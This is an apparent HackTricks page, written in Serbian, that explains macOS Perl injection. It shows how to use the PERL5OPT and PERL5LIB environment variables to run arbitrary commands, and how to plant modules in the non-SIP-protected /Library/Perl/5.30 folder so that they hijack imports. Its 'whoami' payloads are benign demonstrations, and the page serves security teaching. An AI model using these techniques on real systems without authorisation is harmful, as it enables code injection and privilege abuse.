# macOS Perl Applications Injection

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kroz `PERL5OPT` & `PERL5LIB` env promenljive

Korišćenjem env promenljive PERL5OPT moguće je naterati perl da izvrši proizvoljne komande.\
Na primer, kreirajte ovaj skript:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Sada **izvezite env promenljivu** i izvršite **perl** skriptu:

```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```

Druga opcija je da se kreira Perl modul (npr. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Zatim koristite env promenljive:

```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```

## Preko zavisnosti

Moguće je izlistati redosled foldera zavisnosti Perl-a koji se izvršava:

```bash
perl -e 'print join("\n", @INC)'
```

Što će vratiti nešto slično:

```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```

Neke od vraćenih foldera čak ne postoje, međutim, **`/Library/Perl/5.30`** **postoji**, nije **zaštićen** od strane **SIP** i nalazi se **ispred** foldera **zaštićenih SIP-om**. Stoga, neko bi mogao zloupotrebiti taj folder da dodaje zavisnosti skripti tamo kako bi visoko privilegovana Perl skripta mogla da je učita.

{% hint style="warning" %}
Međutim, imajte na umu da **morate biti root da biste pisali u taj folder** i danas ćete dobiti ovaj **TCC prozor**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Na primer, ako skripta uvozi **`use File::Basename;`** bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` da bi se izvršio proizvoljni kod.

## Reference

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
